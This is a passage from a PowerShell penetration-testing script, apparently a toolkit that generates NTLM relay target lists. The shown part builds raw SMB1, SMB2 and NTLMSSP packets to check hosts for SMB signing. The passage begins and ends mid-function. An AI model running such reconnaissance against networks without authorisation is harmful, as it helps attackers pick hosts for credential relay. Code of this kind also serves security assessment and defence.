            $Result = Receive-Job -Job $JobFinished
            # Process the result as needed
            $Result

            Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
        }
    }

    # Clean up all remaining jobs
    $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
}

################################################################################################################
############################################# Function: GenRelayList ###########################################
################################################################################################################
$Signing = @'

Function Get-SMBSigning  {

Param (
    [String]$Target,
    [String[]]$Targets=@(),
    [Float]$Delay,
    [Float]$DelayJitter
    ) 

    #borrowed from https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    #NetBIOS

    function Get-PacketNetBIOSSessionService()
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function Get-PacketSMBHeader()
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
        $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
        $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
        $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
        $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function Get-PacketSMBNegotiateProtocolRequest()
    {
        param([String]$packet_version)

        if($packet_version -eq "SMB1")
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne "SMB1")
        {
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function Get-PacketSMBSessionSetupAndXRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function Get-PacketSMBTreeConnectAndXRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function Get-PacketSMBNTCreateAndXRequest()
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function Get-PacketSMBReadAndXRequest()
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function Get-PacketSMBWriteAndXRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function Get-PacketSMBCloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function Get-PacketSMBTreeDisconnectRequest()
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function Get-PacketSMBLogoffAndXRequest()
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function Get-PacketSMB2Header()
    {
        param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
        $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function Get-PacketSMB2NegotiateProtocolRequest()
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function Get-PacketSMB2SessionSetupRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function Get-PacketSMB2TreeConnectRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function Get-PacketSMB2CreateRequestFile()
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function Get-PacketSMB2ReadRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function Get-PacketSMB2WriteRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function Get-PacketSMB2CloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function Get-PacketSMB2TreeDisconnectRequest()
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function Get-PacketSMB2SessionLogoffRequest()
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function Get-PacketNTLMSSPNegotiate()
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
